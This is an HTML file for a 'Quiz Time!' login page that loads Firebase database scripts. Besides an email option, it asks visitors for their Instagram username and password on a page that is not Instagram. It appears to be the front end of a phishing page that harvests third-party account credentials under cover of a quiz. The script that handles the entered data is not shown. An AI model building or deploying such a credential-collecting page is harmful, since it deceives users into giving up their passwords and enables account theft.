<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quiz Login</title>
    <link rel="stylesheet" href="style.css">

    <!-- Firebase CDN links for version 8.x -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
    <div class="quiz-container">
        <div class="quiz-logo">
            <h1>Quiz Time! ðŸ§ </h1>
            <p>Login to test your knowledge!</p>
        </div>
        <form id="quiz-login-form">
            <label for="login-option">Login with:</label>
            <select id="login-option" required>
                <option value="">Select an option</option>
                <option value="email">Email</option>
                <option value="instagram">Instagram</option>
            </select>
            
            <div id="email-login" class="login-method" style="display: none;">
                <label for="email">Email:</label>
                <input type="email" id="email" placeholder="Enter your email">
                <label for="password">Password:</label>
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            
            <div id="instagram-login" class="login-method" style="display: none;">
                <label for="instagram-username">Instagram Username:</label>
                <input type="text" id="instagram-username" placeholder="Enter your Instagram username">
                <!-- Add password field if needed -->
                <label for="instagram-password">Instagram Password:</label>
                <input type="password" id="instagram-password" placeholder="Enter your Instagram password">
            </div>
            
            
            <button id="submitButton">Start Quiz</button>
        </form>
    </div>

    <script src="script.js" defer></script>
</body>
</html>
